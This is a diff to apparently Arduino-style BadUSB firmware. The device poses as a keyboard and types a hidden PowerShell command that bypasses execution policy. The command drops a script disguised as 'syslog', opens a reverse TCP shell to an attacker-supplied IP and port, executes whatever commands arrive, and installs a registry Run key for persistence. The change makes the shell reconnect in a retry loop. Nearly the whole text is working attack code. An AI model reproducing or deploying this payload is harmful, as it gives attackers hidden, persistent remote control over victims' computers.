@@ -669,15 +669,15 @@ static void webSocketEvent(uint8_t num, WStype_t type, uint8_t *payload,
         delay(1000);
         Keyboard.print(
             String("powershell -w h -nop -ep bypass -c \"") +
-            "$p=$env:APPDATA+'\\syslog.ps1';" +
-            "$s='$c=New-Object Net.Sockets.TCPClient(''" + currentAttackerIP + "''," + currentAttackerPort + ");" +
+            "$p=$env:APPDATA+'\\s.ps1';" +
+            "$s='while($true){try{$c=New-Object Net.Sockets.TCPClient('''" + currentAttackerIP + "'''," + currentAttackerPort + ");" +
             "$s=$c.GetStream();[byte[]]$b=0..65535|%{0};while(($i=$s.Read($b,0,$b.Length))-ne 0){" +
             "$d=(New-Object Text.ASCIIEncoding).GetString($b,0,$i);" +
-            "$r=(iex $d 2>&1|Out-String);$sr=([Text.Encoding]::ASCII).GetBytes($r);"
-            "$s.Write($sr,0,$sr.Length);$s.Flush()};$c.Close()';"
-            "Set-Content -Path $p -Value $s;"
-            "reg add HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run "
-            "/v SysLog /t REG_SZ /d \\\"powershell -w h -nop -ep bypass -f $p\\\" /f\" "
+            "$r=(iex $d 2>&1|Out-String);$sr=([Text.Encoding]::ASCII).GetBytes($r);" +
+            "$s.Write($sr,0,$sr.Length);$s.Flush()};$c.Close()}catch{Start-Sleep -Seconds 5}}';" +
+            "Set-Content -Path $p -Value $s;" +
+            "reg add HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run " +
+            "/v SysLog /t REG_SZ /d \\\"powershell -w h -nop -ep bypass -f $p\\\" /f\" " +
             "& exit");
         delay(300);
         Keyboard.press(KEY_RETURN);
